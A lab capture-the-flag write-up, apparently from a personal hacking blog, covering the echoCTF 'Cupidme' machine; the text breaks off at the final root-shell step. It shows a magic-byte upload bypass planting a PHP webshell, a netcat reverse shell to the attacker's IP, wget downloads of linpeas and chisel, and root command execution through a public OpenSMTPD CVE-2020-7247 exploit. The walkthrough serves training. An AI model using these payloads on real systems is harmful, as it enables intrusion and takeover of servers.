<!doctype html><html lang=en><head><title>echoCTF Cupidme Writeup: File Upload to Root via SMTP :: Hacking Blog</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Step-by-step guide to cracking Cupidme on echoCTF with file upload exploits and SMTP vulnerabilities. Perfect for OSCP prep!"><meta name=keywords content="CTF,hacking,cybersecurity,notes,writeups"><meta name=robots content="noodp"><link rel=canonical href=https://hack.com.cy/writeups/echoctf/cupidme/cupidme/><link rel=stylesheet href=https://hack.com.cy/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://hack.com.cy/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://hack.com.cy/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://hack.com.cy/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://hack.com.cy/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://hack.com.cy/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://hack.com.cy/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://hack.com.cy/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://hack.com.cy/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://hack.com.cy/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://hack.com.cy/css/sidebar.min.d99f1331c4dc2becb305a3d135a35844adbf5c1f39330853456f7e7f5864cb45.css><link rel=stylesheet href=https://hack.com.cy/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://hack.com.cy/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://hack.com.cy/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://hack.com.cy/terminal.css><link rel=stylesheet href=https://hack.com.cy/style.css><link rel="shortcut icon" href=https://hack.com.cy/favicon.png><link rel=apple-touch-icon href=https://hack.com.cy/apple-touch-icon.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="echoCTF Cupidme Writeup: File Upload to Root via SMTP"><meta property="og:description" content="Step-by-step guide to cracking Cupidme on echoCTF with file upload exploits and SMTP vulnerabilities. Perfect for OSCP prep!"><meta property="og:url" content="https://hack.com.cy/writeups/echoctf/cupidme/cupidme/"><meta property="og:site_name" content="Hacking Blog"><meta property="og:image" content="https://hack.com.cy/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="CTF"><meta property="article:section" content="OSCP Prep"><meta property="article:section" content="echoCTF"><meta property="article:published_time" content="2025-07-14 00:00:00 +0000 UTC"><meta name=theme-color content="#0a0e14"><meta name=color-scheme content="dark"><link rel=preload href=/fonts/FiraCode-Latin.woff2 as=font type=font/woff2 crossorigin><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><script defer src=https://hack.com.cy/js/search.js></script></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/why/><div class=logo><img src=/logo.png alt="Hacking Vault" class=logo-image></div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li><li><button class=search-button onclick=showSearch() aria-label=Search>Search</button></li></ul></nav></header><div class=content><nav class=breadcrumbs aria-label=Breadcrumb><ol class=breadcrumb-list><li class=breadcrumb-item><a href=https://hack.com.cy/ class=breadcrumb-link><span class=breadcrumb-icon>~</span>Home</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/echoctf/cupidme/ class=breadcrumb-link></a></li><li class=breadcrumb-separator>/</li><li class="breadcrumb-item breadcrumb-current" aria-current=page><span class=breadcrumb-text>echoCTF Cupidme Writeup: File Upload to Root via SMTP</span></li></ol></nav><style>.breadcrumbs{margin:20px 0 30px;padding:10px 15px;background:var(--background-secondary);border-left:3px solid var(--accent);border-right:1px solid var(--code-border);border-top:1px solid var(--code-border);border-bottom:1px solid var(--code-border)}.breadcrumb-list{display:flex;flex-wrap:wrap;align-items:center;list-style:none;margin:0;padding:0;gap:8px;font-size:.9rem}.breadcrumb-item{display:inline-flex;align-items:center}.breadcrumb-link{color:var(--accent-secondary);text-decoration:none;transition:all .2s ease;display:inline-flex;align-items:center;gap:5px}.breadcrumb-link:hover{color:var(--accent);text-shadow:0 0 5px var(--glow-accent)}.breadcrumb-icon{color:var(--accent);font-weight:700}.breadcrumb-separator{color:var(--code-border);user-select:none}.breadcrumb-current .breadcrumb-text{color:var(--foreground);font-weight:700}@media(max-width:684px){.breadcrumbs{font-size:.85rem;overflow-x:auto}.breadcrumb-list{flex-wrap:nowrap}}</style><article class=post><h1 class=post-title><a href=https://hack.com.cy/writeups/echoctf/cupidme/cupidme/>echoCTF Cupidme Writeup: File Upload to Root via SMTP</a></h1><div class=post-meta><time class=post-date>2025-07-14&nbsp;[Updated 2026-01-01]</time><span class=post-reading-time>7 min read (1399 words)</span></div><span class=post-tags>#<a href=https://hack.com.cy/tags/file-upload/>file upload</a>&nbsp;
#<a href=https://hack.com.cy/tags/php-webshell/>PHP webshell</a>&nbsp;
#<a href=https://hack.com.cy/tags/smtp-exploit/>SMTP exploit</a>&nbsp;
#<a href=https://hack.com.cy/tags/privilege-escalation/>privilege escalation</a>&nbsp;</span><div class=table-of-contents><h2>Contents</h2><nav id=TableOfContents><ul><li><a href=#video-walkthrough>Video Walkthrough</a></li></ul><ul><li><a href=#nmap>NMAP</a></li><li><a href=#output>Output</a></li></ul></nav></div><div class=post-content><div><h2 id=video-walkthrough>Video Walkthrough<a href=#video-walkthrough class=hanchor arialabel=Anchor>#</a></h2><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/WN2w8sJOLlI?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><p><a href="https://www.youtube.com/watch?v=WN2w8sJOLlI"><img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube"></a></p><h1 id=cupidme>Cupidme<a href=#cupidme class=hanchor arialabel=Anchor>#</a></h1><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>#</a></h1><p>Start by port scanning the target machine</p><h2 id=nmap>NMAP<a href=#nmap class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -nvv -p- 10.0.50.1 -T4 -sC -sV
</span></span></code></pre></div><h2 id=output>Output<a href=#output class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT   STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>80/tcp open  http    syn-ack ttl <span class=m>63</span> nginx 1.14.2
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Welcome to Cupid<span class=err>&#39;</span>s homepage
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST
</span></span></code></pre></div><p>Found an nginx webserver version 1.14.2 running on port 80.</p><p>Visiting the webserver and <code>viewing its source code</code> we found a hidden upload form and an indication that the webserver uses PHP as the form &ldquo;action=upload.php&rdquo; exposes the programming language used!</p><p><img src=/images/cupid1.png alt="Image Description"></p><p>By using browser developer tools we can <code>edit the html tag</code> and remove the comment html tags thus making it visible to us. Alternately we can to that using Burp (or any other web proxy).</p><p><img src=/images/cupid2%201.png alt="Image Description"></p><p><img src=/images/cupid3.png alt="Image Description"></p><p>Before we test the upload functionality let start a web directory brute force to find new directories or files that might be hidden.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://10.0.50.1/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o rsw.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/images               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 185<span class=o>]</span> <span class=o>[</span>--&gt; http://10.0.50.1/images/<span class=o>]</span>
</span></span><span class=line><span class=cl>/LICENSE              <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1075<span class=o>]</span>
</span></span><span class=line><span class=cl>/.                    <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 185<span class=o>]</span> <span class=o>[</span>--&gt; http://10.0.50.1/./<span class=o>]</span>
</span></span></code></pre></div><p>We discover an image directory however when try to access it we get 403 FORBIDDEN.</p><p><img src=/images/cupid4.png alt="Image Description"></p><h1 id=exploitation>Exploitation<a href=#exploitation class=hanchor arialabel=Anchor>#</a></h1><p>Lets test the upload functionality by first uploading a simple .txt file and then try to access it from the &ldquo;/image&rdquo; directory. We going to use Burp Suite during the upload functionality to analyze the behavior.</p><p>Captured the upload functionality via Burp Suite:
<img src=/images/cupid5.png alt="Image Description"></p><p>Send it to repeater with CTRL + R so we can repeat the request without going through the whole process of capturing the request > removing the commented form and then upload a file.</p><p><img src=/images/cupid6.png alt="Image Description"></p><p>So we get an error back showing that our Mime-type is wrong. So I did a bit of research of how can we change the Mime-type of a file in Linux and i manage to do it!</p><p>At the start I believed that the &ldquo;Content-Type&rdquo; is the MIme-type but this is not the case..</p><blockquote><p>The main difference depends upon their usage: MimeType describes the nature and format of a file or data across various systems, While <strong>ContentType is used in HTTP headers to include not only the MimeType but also additional parameters such as character encoding</strong></p></blockquote><p>So how does a &ldquo;.jpeg&rdquo; file looks in raw format. Lets upload a legitimate .jpeg file and see if its accepted.</p><p><img src=/images/cupid7.png alt="Image Description"></p><p>Indeed the .jpeg file is accepted, as we can see the error changed. When i try to copy and paste the contents of file colored in red under the <code>Content-Type:image/jpeg</code> i came across an overview explaining that <code>"ÿØÿî"</code> its the JPEG <code>magic number</code></p><p><img src=/images/cupid8.png alt="Image Description"><img src=/images/cupid9.png alt="Image Description"></p><p>The searching the keyword <code>files magic numbers</code> i landed here.</p><p><a href=https://en.wikipedia.org/wiki/List_of_file_signatures>https://en.wikipedia.org/wiki/List_of_file_signatures</a></p><p><img src=/images/cipd10.png alt="Image Description"></p><p>If we search for JPEG we can see its <code>magic byte</code> representation</p><p><img src=/images/cupid11.png alt="Image Description"></p><p>Now that we know that lets try to replace the rest of the content of JPEG image with text and leave only the magic byte as is. Also change the file extension to <code>.txt</code></p><p><img src=/images/cupid12.png alt="Image Description"></p><p>We did it !
Trying to view the file on <code>/images</code> downloads the file with our text!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat ~/Downloads/video-001.rgb.txt
</span></span><span class=line><span class=cl>����
</span></span><span class=line><span class=cl>Dotpirate Test
</span></span></code></pre></div><p>Since we know that the webserver can run PHP scripts we can try and upload a reverse shell and see how it behaves.</p><p><img src=/images/cupid14.png alt="Image Description"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat video-001.rgb.jpeg.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ÿØÿî
</span></span><span class=line><span class=cl>&lt;?php system<span class=o>(</span><span class=nv>$_GET</span><span class=o>[</span><span class=s1>&#39;dot&#39;</span><span class=o>])</span><span class=p>;</span> ?&gt;
</span></span></code></pre></div><p><img src=/images/cupid15.png alt="Image Description"></p><p>And we get execution on the server by visiting :
<code>http://10.0.50.1/images/video-001.rgb.jpeg.php?dot=id</code></p><p>Lets get a reverse shell!</p><p>First lets check if <code>netcat</code> is installed on the target sever by using <code>which nc</code></p><p><img src=/images/cupid17.png alt="Image Description"></p><p>The binary is there so lets try to get a revshell now.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nc -nvlp <span class=m>80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>http://10.0.50.1/images/video-001.rgb.jpeg.php?dot<span class=o>=</span>nc 10.10.11.150 <span class=m>80</span> -e /bin/bash
</span></span></code></pre></div><p><img src=/images/cupid18.png alt="Image Description"></p><p>Success!</p><h1 id=privilege-escalation>Privilege Escalation<a href=#privilege-escalation class=hanchor arialabel=Anchor>#</a></h1><p>Lets upgrade our shell using python</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>CTRL + Z
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>stty raw -echo<span class=p>;</span><span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Press Enter<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>Manual enumeration i always do before going for automated scripts</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Check who we are?</span>
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># What other users exist on the box?</span>
</span></span><span class=line><span class=cl>cat /etc/passwd <span class=p>|</span> grep sh$
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Do i have sudo capabilities?</span>
</span></span><span class=line><span class=cl>sudo -l
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Are there ant localservices running on the box?</span>
</span></span><span class=line><span class=cl>netstat -ano <span class=p>|</span> grep LIST
</span></span><span class=line><span class=cl>ss -antp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Always check the directroy we landed it, in this case is `/var/www/html/images`</span>
</span></span><span class=line><span class=cl>ls -la
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Check for wierd files in `/opt` and `/tmp`</span>
</span></span><span class=line><span class=cl>ls -la /tmp <span class=o>&amp;&amp;</span> ls -la /opt
</span></span></code></pre></div><p>Analyzing the output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@cupidme:~/html/images$ <span class=nb>pwd</span>
</span></span><span class=line><span class=cl>/var/www/html/images
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@cupidme:~/html/images$ ls -la /tmp <span class=o>&amp;&amp;</span> ls -la /opt
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>drwxrwxrwt <span class=m>1</span> root root <span class=m>4096</span> Aug <span class=m>12</span> 09:05 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>1</span> root root <span class=m>4096</span> Aug <span class=m>12</span> 07:23 ..
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root root <span class=m>4096</span> Oct <span class=m>12</span>  <span class=m>2020</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>1</span> root root <span class=m>4096</span> Aug <span class=m>12</span> 07:23 ..
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@cupidme:~/html/images$ sudo -l
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We trust you have received the usual lecture from the <span class=nb>local</span> System
</span></span><span class=line><span class=cl>Administrator. It usually boils down to these three things:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>#1) Respect the privacy of others.</span>
</span></span><span class=line><span class=cl>    <span class=c1>#2) Think before you type.</span>
</span></span><span class=line><span class=cl>    <span class=c1>#3) With great power comes great responsibility.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> www-data: 
</span></span><span class=line><span class=cl>Sorry, try again.
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> www-data: 
</span></span><span class=line><span class=cl>Sorry, try again.
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> www-data: 
</span></span><span class=line><span class=cl>sudo: <span class=m>3</span> incorrect password attempts
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@cupidme:~/html/images$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@cupidme:~/html/images$ cat /etc/passwd <span class=p>|</span>grep sh$
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>ETSCTF:x:375:65534:ETSCTF_e20a6a5bf097fd763539867c299ece88:/home/ETSCTF:/bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@cupidme:~/html/images$ ss -antp
</span></span><span class=line><span class=cl>State                  Recv-Q             Send-Q                         Local Address:Port                          Peer Address:Port                                                                                                                                                   
</span></span><span class=line><span class=cl>LISTEN                 <span class=m>0</span>                  <span class=m>511</span>                                127.0.0.1:9001                               0.0.0.0:*                 users:<span class=o>((</span><span class=s2>&#34;ss&#34;</span>,pid<span class=o>=</span>2161,fd<span class=o>=</span>5<span class=o>)</span>,<span class=o>(</span><span class=s2>&#34;bash&#34;</span>,pid<span class=o>=</span>2055,fd<span class=o>=</span>5<span class=o>)</span>,<span class=o>(</span><span class=s2>&#34;python3&#34;</span>,pid<span class=o>=</span>2054,fd<span class=o>=</span>5<span class=o>)</span>,<span class=o>(</span><span class=s2>&#34;bash&#34;</span>,pid<span class=o>=</span>2009,fd<span class=o>=</span>5<span class=o>)</span>,<span class=o>(</span><span class=s2>&#34;sh&#34;</span>,pid<span class=o>=</span>2008,fd<span class=o>=</span>5<span class=o>))</span>            
</span></span><span class=line><span class=cl>LISTEN                 <span class=m>0</span>                  <span class=m>5</span>                                  127.0.0.1:25                                 0.0.0.0:*                                                                                                                                                      
</span></span><span class=line><span class=cl>LISTEN                 <span class=m>0</span>                  <span class=m>4096</span>                              127.0.0.11:33755                              0.0.0.0:*                                                                                                                                                      
</span></span><span class=line><span class=cl>LISTEN                 <span class=m>0</span>                  <span class=m>511</span>                                  0.0.0.0:80                                 0.0.0.0:*                 users:<span class=o>((</span><span class=s2>&#34;nginx&#34;</span>,pid<span class=o>=</span>62,fd<span class=o>=</span>6<span class=o>)</span>,<span class=o>(</span><span class=s2>&#34;nginx&#34;</span>,pid<span class=o>=</span>61,fd<span class=o>=</span>6<span class=o>)</span>,<span class=o>(</span><span class=s2>&#34;nginx&#34;</span>,pid<span class=o>=</span>60,fd<span class=o>=</span>6<span class=o>))</span>                                                            
</span></span><span class=line><span class=cl>TIME-WAIT              <span class=m>0</span>                  <span class=m>0</span>                                  127.0.0.1:47982                            127.0.0.1:80                                                                                                                                                     
</span></span><span class=line><span class=cl>TIME-WAIT              <span class=m>0</span>                  <span class=m>0</span>                                  127.0.0.1:54946                            127.0.0.1:80                                                                                                                                                     
</span></span><span class=line><span class=cl>TIME-WAIT              <span class=m>0</span>                  <span class=m>0</span>                                  127.0.0.1:57956                            127.0.0.1:9001                                                                                                                                                   
</span></span><span class=line><span class=cl>TIME-WAIT              <span class=m>0</span>                  <span class=m>0</span>                                  127.0.0.1:52330                            127.0.0.1:9001                                                                                                                                                   
</span></span><span class=line><span class=cl>TIME-WAIT              <span class=m>0</span>                  <span class=m>0</span>                                  127.0.0.1:9001                             127.0.0.1:57944                                                                                                                                                  
</span></span><span class=line><span class=cl>ESTAB                  <span class=m>0</span>                  <span class=m>2</span>                                  10.0.50.1:51938                         10.10.11.150:80                users:<span class=o>((</span><span class=s2>&#34;python3&#34;</span>,pid<span class=o>=</span>2054,fd<span class=o>=</span>1<span class=o>)</span>,<span class=o>(</span><span class=s2>&#34;python3&#34;</span>,pid<span class=o>=</span>2054,fd<span class=o>=</span>0<span class=o>)</span>,<span class=o>(</span><span class=s2>&#34;bash&#34;</span>,pid<span class=o>=</span>2009,fd<span class=o>=</span>1<span class=o>)</span>,<span class=o>(</span><span class=s2>&#34;bash&#34;</span>,pid<span class=o>=</span>2009,fd<span class=o>=</span>0<span class=o>))</span>                            
</span></span><span class=line><span class=cl>CLOSE-WAIT             <span class=m>9</span>                  <span class=m>0</span>                                  127.0.0.1:9001                             127.0.0.1:42676             users:<span class=o>((</span><span class=s2>&#34;ss&#34;</span>,pid<span class=o>=</span>2161,fd<span class=o>=</span>3<span class=o>)</span>,<span class=o>(</span><span class=s2>&#34;bash&#34;</span>,pid<span class=o>=</span>2055,fd<span class=o>=</span>3<span class=o>)</span>,<span class=o>(</span><span class=s2>&#34;python3&#34;</span>,pid<span class=o>=</span>2054,fd<span class=o>=</span>3<span class=o>)</span>,<span class=o>(</span><span class=s2>&#34;bash&#34;</span>,pid<span class=o>=</span>2009,fd<span class=o>=</span>3<span class=o>)</span>,<span class=o>(</span><span class=s2>&#34;sh&#34;</span>,pid<span class=o>=</span>2008,fd<span class=o>=</span>3<span class=o>))</span>            
</span></span><span class=line><span class=cl>TIME-WAIT              <span class=m>0</span>                  <span class=m>0</span>                                  127.0.0.1:9001                             127.0.0.1:52314                                                                                                                                                  
</span></span><span class=line><span class=cl>www-data@cupidme:~/html/images$ 
</span></span></code></pre></div><p>There are 2 local services running on ports 25 which SMTP and 9001 which is unknown for as at the moment. We can further fingerprint this ports using <code>nc</code> since is already installed on the target machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@cupidme:~/html/images$ nc -nvC 127.0.0.1 <span class=m>9001</span>
</span></span><span class=line><span class=cl><span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>127.0.0.1<span class=o>]</span> <span class=m>9001</span> <span class=o>(</span>?<span class=o>)</span> open
</span></span><span class=line><span class=cl>HELP
</span></span><span class=line><span class=cl>?
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@cupidme:~/html/images$ nc -nvC 127.0.0.1 <span class=m>25</span>
</span></span><span class=line><span class=cl><span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>127.0.0.1<span class=o>]</span> <span class=m>25</span> <span class=o>(</span>?<span class=o>)</span> open
</span></span><span class=line><span class=cl><span class=m>220</span> cupidme.echocity-f.com ESMTP OpenSMTPD
</span></span><span class=line><span class=cl>VERSION
</span></span><span class=line><span class=cl><span class=m>500</span> 5.5.1 Invalid command: Command unrecognized
</span></span><span class=line><span class=cl>HELP
</span></span><span class=line><span class=cl>214-2.0.0 This is OpenSMTPD
</span></span><span class=line><span class=cl>214-2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org
</span></span><span class=line><span class=cl>214-2.0.0 with full details
</span></span><span class=line><span class=cl><span class=m>214</span> 2.0.0 End of HELP info
</span></span></code></pre></div><p>Now we now that port 25 is running <code>OpenSMTPD</code>.
Lets do an automated enumeration as well using linpeas.sh by first transferring it to the server.</p><p>An easy way to transfer files is by using http, utilizing python3 to server webserver and then use either <code>curl</code> or <code>wget</code> to download it.</p><blockquote><p>More File Transfer Techniques can be found in my <a href=/notes/file-transfers/>notes</a>
Also linpeas can be found <a href=https://github.com/peass-ng/PEASS-ng/releases/download/20250801-03e73bf3/linpeas.sh>here</a></p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># On kali</span>
</span></span><span class=line><span class=cl>python3 -m http.server <span class=m>80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># On Target</span>
</span></span><span class=line><span class=cl>wget http://10.10.11.150/linpeas.sh -O /tmp/linpeas.sh
</span></span><span class=line><span class=cl>chmod +x /tmp/linpeas.sh
</span></span><span class=line><span class=cl>/tmp/linpeas.sh
</span></span></code></pre></div><p>We can see that the <code>smtpd</code> is running as root
<img src=/images/cupid19.png alt="Image Description"></p><p>We can also see that that port 9001 is the website running locally
<img src=/images/cupid20.png alt="Image Description"></p><p>According to the enumeration, it seems that the logical path to follow is towards exploiting the SMTPD service since its running as root and we can also interact with it. Lets find out the version of the OpenSMTPD and see if it is vulnerable to any publicly known exploits.</p><p>I could not find a way to get the version of the <code>opensmtpd</code> service so I decided to do port forwarding and then run nmap on it. For this I used <code>chisel</code></p><blockquote><p>Various Port Forwarding concepts can also be found in my <a href=/notes/port-forwarding/>notes</a>
Chisel binaries can be found <a href=https://github.com/jpillora/chisel/releases/tag/v1.10.1>here</a></p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># On Kali</span>
</span></span><span class=line><span class=cl>python3 -m http.server <span class=m>80</span>
</span></span><span class=line><span class=cl>./chisel server --reverse --port <span class=m>8810</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># On Target</span>
</span></span><span class=line><span class=cl>wget http://10.10.11.150/chisel -O /tmp/chisel
</span></span><span class=line><span class=cl>chmod +x /tmp/chisel
</span></span><span class=line><span class=cl>/tmp/chisel client 10.10.11.150:8810 R:25:127.0.0.1:25
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># On Kali</span>
</span></span><span class=line><span class=cl>sudo nmap -vv -p25 127.0.0.1 -sC -sV
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>25/tcp open  smtp    syn-ack ttl <span class=m>64</span> OpenSMTPD
</span></span><span class=line><span class=cl><span class=p>|</span> smtp-commands: cupidme.echocity-f.com Hello localhost <span class=o>[</span>127.0.0.1<span class=o>]</span>, pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
</span></span><span class=line><span class=cl><span class=p>|</span>_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
</span></span><span class=line><span class=cl>Service Info: Host: cupidme.echocity-f.com
</span></span></code></pre></div><p>Now we got the version! <code>OpenSMTPD 2.0.0</code> lets search for an exploit</p><p><img src=/images/cupid21.png alt="Image Description"></p><p>To use this exploit the developer suggest to install some python libraries and then use it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -m venv .venv
</span></span><span class=line><span class=cl><span class=nb>source</span> .venv/bin/activate 
</span></span><span class=line><span class=cl>pip3 install pwntools
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git clone https://github.com/SimonSchoeni/CVE-2020-7247-POC.git
</span></span><span class=line><span class=cl><span class=nb>cd</span> CVE-2020-7247-POC
</span></span><span class=line><span class=cl><span class=c1># Creating a file to see if we have command execution!</span>
</span></span><span class=line><span class=cl>python3 exploit.py --targetHost 127.0.0.1 --targetPort <span class=m>25</span> --customCommand <span class=s1>&#39;touch /tmp/fromroot&#39;</span>
</span></span></code></pre></div><p>We can see that we do have command execution and the file is created in /tmp by root!</p><p><img src=/images/cupid22.png alt="Image Description"></p><p>Lets get a reverse shell using <code>nc</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nc -nvlp <span class=m>1337</span>
</span></span><span class=line><span class=cl>
